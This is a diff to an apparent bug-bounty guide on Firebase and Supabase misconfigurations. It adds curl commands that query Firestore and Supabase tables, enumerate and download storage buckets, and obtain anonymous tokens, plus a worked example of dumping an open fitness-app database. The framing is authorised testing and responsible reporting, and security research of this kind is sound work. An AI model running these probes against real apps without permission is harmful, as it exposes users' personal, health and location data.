@@ -27,7 +27,7 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 | 5 | Auth-only rules (no owner check) | Rules check `auth != null` but not `auth.uid == resource.data.userId` | Any authenticated user reads all data |
 | 6 | Cloud Functions unauthenticated | Call function endpoints without auth headers | Direct function invocation |
 | 7 | Service account key in client | Search binary for `"type": "service_account"` | Full project admin access |
-| 8 | Firestore rules bypass via REST | Use REST API directly instead of SDK (different rule evaluation) | SDK-enforced rules not applied |
+| 8 | Firestore REST as alternate client surface | Test REST API directly (same Security Rules apply, but different client behavior may reveal misconfigs) | Rules still enforced; IAM-auth only bypasses with service account |
 
 **Finding Firebase project ID:**
 - `google-services.json` (Android) or `GoogleService-Info.plist` (iOS)
@@ -46,6 +46,54 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 4. Test Storage: list bucket contents via googleapis.com
 5. Check Cloud Functions: call endpoints from extracted URLs without auth
 6. For auth-gated data: create free account, test if rules check ownership
+```
+
+### Firestore REST API Testing (often missed)
+
+Many hunters only test Realtime Database. Firestore is a separate product with its own REST API.
+
+```bash
+# 1. List documents in a collection (requires knowing collection name)
+# Common collection names: users, profiles, orders, messages, payments, settings
+curl "https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/users"
+
+# 2. If auth required, get an ID token first:
+# Anonymous sign-up (only works if anonymous auth is enabled in project):
+curl "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{"returnSecureToken": true}'
+# If anonymous auth is disabled, create a test account via email/password sign-up instead.
+# Extract idToken from response
+
+# 3. Query Firestore with auth token:
+curl "https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/users" \
+  -H "Authorization: Bearer {ID_TOKEN}"
+
+# 4. Test structured query (bypass simple rules):
+curl "https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents:runQuery" \
+  -H "Authorization: Bearer {ID_TOKEN}" \
+  -H "Content-Type: application/json" \
+  -d '{"structuredQuery": {"from": [{"collectionId": "users"}], "limit": 10}}'
+```
+
+### Firebase Storage Enumeration
+
+```bash
+# 1. List all files in default bucket
+# New projects (after Oct 2024) use: {PROJECT_ID}.firebasestorage.app
+# Older projects use: {PROJECT_ID}.appspot.com
+# Try both:
+curl "https://firebasestorage.googleapis.com/v0/b/{PROJECT_ID}.firebasestorage.app/o"
+curl "https://firebasestorage.googleapis.com/v0/b/{PROJECT_ID}.appspot.com/o"
+
+# 2. Download a specific file
+curl "https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{FILE_PATH}?alt=media"
+
+# 3. Common high-value paths to check:
+# - /uploads/ (user uploads — may contain ID documents, photos)
+# - /backups/ (database backups)
+# - /exports/ (data exports)
+# - /profile_pictures/ (PII indicator)
 ```
 
 ### Firebase Severity Escalation
@@ -67,7 +115,7 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 | 1 | Exposed anon key | Extract `supabaseUrl` and `supabaseAnonKey` from client | Direct API access with anonymous role |
 | 2 | Service role key in client | Search for `service_role` key (should never be in client) | Full database admin access |
 | 3 | Missing RLS policies | Query tables via `supabase.from('table').select('*')` with anon key | Read all rows without auth |
-| 4 | RLS bypass via direct SQL | Use `rpc()` to call functions that bypass RLS | Circumvent row-level security |
+| 4 | RPC functions as RLS bypass | Call `rpc()` functions defined as `SECURITY DEFINER` under a `bypassrls` owner — these skip RLS | Circumvent row-level security (only if function is misconfigured) |
 | 5 | Storage bucket public | List and download from public storage buckets | File exposure |
 | 6 | Auth bypass | Test password reset, magic link, and OAuth flows for bypasses | Account takeover |
 
@@ -87,6 +135,48 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 5. Test storage: list public buckets and download files
 6. Test auth: password reset, magic link, OAuth flows
 ```
+
+### Supabase RLS Deep Testing
+
+RLS (Row Level Security) is Supabase's primary access control. Many developers enable it but write weak policies.
+
+```bash
+# 1. Discover tables — there is no built-in RPC for this.
+# Instead, extract table names from client code or network traffic (see discovery section below).
+
+# 2. Test each table for missing RLS
+curl "https://{PROJECT}.supabase.co/rest/v1/{TABLE}?select=*&limit=5" \
+  -H "apikey: {ANON_KEY}" \
+  -H "Authorization: Bearer {ANON_KEY}"
+# Common tables: profiles, users, orders, messages, payments, subscriptions
+
+# 3. Test with authenticated user — check for ownership checks
+# Sign up first, then query other users' data:
+curl "https://{PROJECT}.supabase.co/rest/v1/profiles?select=*&id=neq.{YOUR_ID}" \
+  -H "apikey: {ANON_KEY}" \
+  -H "Authorization: Bearer {USER_JWT}"
+# If you get other users' profiles → RLS policy checks auth but not ownership
+
+# 4. Test RPC functions (bypass RLS only if defined as SECURITY DEFINER with bypassrls owner):
+# Most functions run as SECURITY INVOKER and respect RLS. Check for misconfigured ones:
+curl "https://{PROJECT}.supabase.co/rest/v1/rpc/{FUNCTION_NAME}" \
+  -H "apikey: {ANON_KEY}" \
+  -H "Content-Type: application/json" \
+  -d '{"param": "value"}'
+
+# 5. Test storage buckets
+curl "https://{PROJECT}.supabase.co/storage/v1/object/list/{BUCKET}" \
+  -H "apikey: {ANON_KEY}" \
+  -H "Authorization: Bearer {ANON_KEY}"
+```
+
+### Supabase Table Discovery Techniques
+
+When you don't know table names:
+1. **Client code analysis** — search decompiled code for `.from('` or `supabase.from(`
+2. **Network traffic** — watch for `/rest/v1/{table}` requests
+3. **Common names** — try: users, profiles, accounts, orders, products, messages, notifications, payments, subscriptions, settings, teams, organizations
+4. **Error messages** — invalid table names sometimes reveal valid ones in error responses
 
 ---
 
@@ -118,7 +208,7 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 - App Store Server API v2 — verify the app validates against Apple's API, not just locally
 - Sandbox vs production environment separation — test if sandbox receipts accepted in prod
 
-**Google Play Billing v6+:**
+**Google Play Billing (v7+/v8):**
 - Signed purchase tokens — test if signature verification is implemented
 - Voided purchases API — test if app checks for refunded/voided purchases
 - Promo codes — test for abuse in promo code redemption flow
@@ -135,6 +225,43 @@ BaaS misconfigs are a **rapidly growing mobile attack surface** — 20+ data bre
 | Missing RLS with authenticated access | High | Any user reads all data |
 | In-app purchase bypass (premium features) | Medium-High | Financial impact to vendor |
 | Client-side subscription check bypass | Medium | Limited to the device |
+
+---
+
+## Worked Example: Firebase Open Database → Critical PII Exposure
+
+**Scenario:** Fitness tracking app with Firebase backend. Discovered via mobile APK analysis.
+
+**Step 1 — Extract Firebase config from APK:**
+```bash
+jadx -d output fitness.apk
+grep -rn "firebaseio.com\|firebase.*project" output/
+# Found in google-services.json:
+# "project_id": "fitness-tracker-prod",
+# "firebase_url": "https://fitness-tracker-prod.firebaseio.com"
+```
+
+**Step 2 — Test Realtime Database access:**
+```bash
+curl "https://fitness-tracker-prod.firebaseio.com/.json"
+# Response: 200 OK
+# Returns: {"users": {"uid1": {"email": "user@example.com", "weight": 180,
+#   "health_data": {...}, "location_history": [...]}}, ...}
+# → Full database dump — emails, health data, GPS locations for ALL users
+```
+
+**Step 3 — Assess scope:**
+```bash
+# Count records (estimate from response size)
+curl -s "https://fitness-tracker-prod.firebaseio.com/users.json?shallow=true" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))"
+# Output: 47832 (users affected)
+```
+
+**Finding:** Firebase Realtime Database with `.read: true` security rules exposes 47,832 user records including emails, health data, and GPS location history. No authentication required. **Severity: Critical.** Health data may create regulatory exposure depending on jurisdiction and business model (GDPR in EU; HIPAA in US only if operator is a covered entity/business associate).
+
+**Report note:** Include the `curl` command and a redacted sample of 2-3 records as proof. Do NOT download the full database — demonstrate access, estimate scope, and report immediately.
+
+**Context:** A similar Firebase misconfiguration in an AI chat app exposed 300M messages from 25M users in January 2026 (Hackread). Researchers found 103 of 200 tested iOS apps had the same class of misconfiguration.
 
 ---
 
